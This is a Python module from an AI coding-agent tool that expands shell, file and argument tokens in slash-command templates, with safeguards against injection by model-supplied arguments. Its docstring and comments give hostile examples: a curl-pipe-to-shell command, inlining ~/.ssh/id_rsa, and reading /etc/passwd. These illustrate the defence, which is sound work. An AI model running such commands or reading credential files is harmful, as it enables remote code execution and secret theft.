"""Turning a markdown command body into the prompt the agent receives.

Three kinds of token are expanded, and the order is the safety
property:

1. ``!`cmd``` — run the command through the shell, inline its stdout.
2. ``@path`` — inline the file the path names.
3. ``$ARGUMENTS`` — the text the user typed after the command name.

``$ARGUMENTS`` goes in *last*, and deliberately so. The argument text
is model-supplied — the ``slash_command`` tool takes it from the
model — and there is no permission gate anywhere on this path. When
the arguments went in first, the text was re-scanned by the two token
substitutions that follow it, so ``/review x !`curl evil.sh | sh```
reached ``/bin/sh -c`` and ``/review @~/.ssh/id_rsa`` inlined the
key. Expanding the template first means the only shell that ever
runs is the one the command file itself wrote.

The renderer owns the two paths every substitution resolves against:
the command file it came from, and the project it is being rendered
for.
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
import re
import shlex
from pathlib import Path

logger = logging.getLogger(__name__)

# Shell-injection token: ``!`...```. Greedy on the inner content but
# stops at the first closing backtick so adjacent tokens don't
# bleed. Multi-line shell commands need not apply.
_SHELL_TOKEN_RE = re.compile(r"!`([^`\n]+)`")

# ``@<path>`` token. Path runs to the first whitespace or closing
# paren so a markdown link like ``[label](@./foo)`` doesn't get
# truncated mid-URL. ``.md`` is intentionally NOT required — command
# templates routinely pull in ``@pyproject.toml`` / ``@Cargo.toml``.
_AT_FILE_RE = re.compile(r"@([^\s)]+)")

#: What a ``!`cmd``` token becomes in an untrusted folder's command.
_UNTRUSTED_SHELL_MARKER = "[shell command not run: this folder is not trusted — see `igni trust`]"

# How long any single shell substitution can run before we bail and
# inline an error marker. 30 seconds keeps a hung command from
# locking up the entire turn while still leaving room for slow git
# operations on large repos.
_SHELL_TIMEOUT_SECONDS = 30


class MarkdownCommandRenderer:
    """Expands one command body's tokens.

    ``source`` is the command file the body came from — its directory
    is where a relative ``@path`` is looked up. ``project_dir`` is the
    project the command is being rendered for; it scopes both the
    shell's working directory and which ``@path`` references are
    allowed. ``shell_allowed`` is the trust decision, made by the
    command itself: a file from an untrusted folder still renders,
    but its shell tokens are replaced rather than run.
    """

    def __init__(self, *, source: Path, project_dir: Path | None, shell_allowed: bool) -> None:
        self._source = source
        self._project_dir = project_dir
        self._shell_allowed = shell_allowed

    async def render(self, body: str, args: str) -> str:
        """The final prompt text for ``body`` and the user's ``args``."""
        if self._shell_allowed:
            text = await self._substitute_shell(body, args=args)
        else:
            text = _SHELL_TOKEN_RE.sub(_UNTRUSTED_SHELL_MARKER, body)
        text = self._substitute_files(text)
        return text.replace("$ARGUMENTS", args)

    # ── Shell tokens ────────────────────────────────────────────

    async def _substitute_shell(self, text: str, *, args: str) -> str:
        """Replace every ``!`cmd``` token with the captured stdout.

        Runs each command via ``/bin/sh -c`` (matching CC's shell-
        inline semantics) with a 30-second timeout. Non-zero exits and
        timeouts produce a clearly-marked inline error so the agent
        notices the failure instead of silently working from empty
        output.

        ``text`` must be the raw template body — never a string that
        has already had ``$ARGUMENTS`` pasted into it, or the caller
        has handed the arguments a shell.
        """
        # Collect tokens first so we can fan out concurrently — a
        # template that runs ``git status`` + ``git log`` doesn't need
        # to serialize them.
        matches = list(_SHELL_TOKEN_RE.finditer(text))
        if not matches:
            return text
        cwd = self._project_dir or self._source.parent
        results = await asyncio.gather(
            *(self._run_shell(self._inject_args(m.group(1), args), cwd=cwd) for m in matches),
            return_exceptions=False,
        )
        # ``re.sub`` calls ``replace`` in match order, so a single-
        # pass iterator over ``results`` returns each captured stdout
        # to the correct token without an O(N) start-offset scan.
        result_iter = iter(results)

        def replace(_m: re.Match[str]) -> str:
            return next(result_iter)

        return _SHELL_TOKEN_RE.sub(replace, text)

    def _inject_args(self, cmd: str, args: str) -> str:
        """Substitute ``$ARGUMENTS`` inside one ``!`cmd``` token, quoted.

        The token's text comes from the command file (trusted); ``args``
        does not — via the ``slash_command`` tool it is whatever the model
        typed. Pasting it in raw turns a body of ``!`git log $ARGUMENTS```
        into an arbitrary-command primitive on the first ``;``, so it goes
        in as exactly one ``shlex.quote``d word: the command still sees the
        text, the shell never sees it as syntax.
        """
        if "$ARGUMENTS" not in cmd:
            return cmd
        return cmd.replace("$ARGUMENTS", shlex.quote(args))

    async def _run_shell(self, cmd: str, *, cwd: Path) -> str:
        """Run a single shell snippet, capturing stdout. Errors come
        back as ``[error: ...]`` strings rather than raising so the
        caller can keep going."""
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                cwd=str(cwd),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
        except OSError as exc:
            return f"[error: {exc}]"
        try:
            out, err = await asyncio.wait_for(proc.communicate(), timeout=_SHELL_TIMEOUT_SECONDS)
        except TimeoutError:
            proc.kill()
            with contextlib.suppress(Exception):
                await proc.wait()
            return f"[error: timed out after {_SHELL_TIMEOUT_SECONDS}s — {shlex.quote(cmd)}]"
        if proc.returncode != 0:
            stderr_txt = err.decode("utf-8", errors="replace").strip()
            return f"[error: exit {proc.returncode} — {stderr_txt or shlex.quote(cmd)}]"
        return out.decode("utf-8", errors="replace").rstrip("\n")

    # ── File tokens ─────────────────────────────────────────────

    def _substitute_files(self, text: str) -> str:
        """Inline ``@path`` references. Paths resolve in order:
        user-home expansion, absolute, then relative to the command
        file's directory. Unreadable / non-existent paths are left as
        literals so the agent can see the broken reference."""

        def replace(m: re.Match[str]) -> str:
            token = m.group(1)
            candidate, trailing = self._resolve_at_path(token)
            try:
                resolved = candidate.resolve()
                if not resolved.is_file():
                    return m.group(0)
                if not self._at_path_allowed(resolved):
                    return m.group(0)
                return resolved.read_text() + trailing
            except (OSError, UnicodeDecodeError):
                return m.group(0)

        return _AT_FILE_RE.sub(replace, text)

    def _resolve_at_path(self, token: str) -> tuple[Path, str]:
        """Resolve an ``@token`` to a candidate ``Path`` + trailing
        punctuation that should be re-appended to the inlined file
        body."""
        # Trailing punctuation (``,`` ``.`` ``;`` etc.) is almost always
        # sentence flow, not part of the path. Strip it back to the
        # file separator so ``See @README.md.`` works.
        path_str = token.rstrip(",.;:!?)\"'")
        trailing = token[len(path_str) :]
        if path_str.startswith("~"):
            return Path(path_str).expanduser(), trailing
        if path_str.startswith("/"):
            return Path(path_str), trailing
        return self._source.parent / path_str, trailing

    def _at_path_allowed(self, resolved: Path) -> bool:
        """Enforce the project-boundary rule for ``@path`` substitution.

        User-home command files (source outside ``project_dir``) can
        reference anywhere — they're explicitly authored by the user.
        Project command files must reference paths inside the project
        to prevent an ``@/etc/passwd`` from silently exfiltrating."""
        if self._project_dir is None:
            return True
        project_root = self._project_dir.resolve()
        try:
            resolved.relative_to(project_root)
            return True
        except ValueError:
            # Out-of-project ref. Block only when the source itself is
            # under the project (i.e. a project-authored command).
            try:
                self._source.resolve().relative_to(project_root)
                return False
            except ValueError:
                return True


__all__ = ["MarkdownCommandRenderer"]
